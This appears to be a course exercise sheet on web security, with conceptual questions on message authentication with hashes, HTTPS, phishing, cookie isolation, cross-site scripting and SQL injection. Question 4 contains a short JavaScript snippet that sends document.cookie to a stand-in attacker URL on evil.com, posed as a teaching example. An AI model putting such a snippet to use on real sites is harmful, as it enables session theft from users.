# Exercises sheet 3 Web Security

**There will be no written corrections. Exercises will be discussed during the recorded live Q&A. Come and prepare questions.**

1. Barack often sends funny jokes to Hillary. He does not care about confidentiality of these messages but wants to get credit for the jokes and prevent Bill from claiming authorship of or modifying them. How can this be achieved using public-key cryptography? 
2. As public-key cryptography is computationally intensive and drains the battery of Barack’s device, he comes up with an alternative approach. First, he shares a secret key k with Hillary but not with Bill. Next, together with a joke x, he sends over the value d = h(k||x), where h is a cryptographic hash function. Does value d provide assurance to Hillary that Barack is the author of x and that xwas not modified by Bill? Justify your answer.
3. Barack periodically comes up with brilliant ideas to stop the financial crisis, provide health care to every citizen, and save the polar bears. He wants to share these ideas with all the cabinet members but also get credit for the ideas. Extending the above approach, he shares a secret key k with all the cabinet members. Next, he broadcasts each idea z followed by value h(k||z). Does this approach work or can Tim claim that he came up with the ideas instead of Barack? Justify your answer. 
4. Suppose that you accedently visit a malicious site www.evil.com, which contains a JavaScript to access cookies related to your e-shopping site buy-all.bz as follows:
`<script>
img = new Image();
img.src = "http://www.evil.com/steal.php?cookie=" + document.cookie;
</script>`. Will that be successful? Why or why not?
5. Which of the following security goals are addressed by the HTTPS protocol: (a) privacy, (b) confidentiality, (c) availability.
6. Is it possible for an attacker to performa phishing attack if the client is using HTTPS? Why or why not? 
7. Explain why, in general, a web server should not be allowed access to cookies set by another web server. 
8. Summarize the difference between persistent and non-persistent cross-site scripting attacks. 
9. Explain why input validation mitigates the risks of SQL injection attacks.